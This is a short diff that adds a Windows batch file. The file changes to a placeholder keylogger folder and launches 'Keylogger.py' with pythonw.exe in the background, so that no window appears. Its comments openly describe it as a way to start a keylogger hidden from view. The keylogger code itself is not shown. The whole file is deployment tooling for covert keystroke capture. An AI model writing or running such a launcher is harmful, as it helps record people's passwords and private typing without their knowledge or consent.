@@ -1,0 +1,8 @@
+@echo off
+REM Replace the path below with your actual keylogger folder path
+
+REM TODO: Change this to your keylogger folder path
+cd /d "C:\PATH\TO\YOUR\KEYLOGGER\FOLDER"
+
+REM Start the keylogger in background (no window)
+start /B pythonw.exe "Keylogger.py"
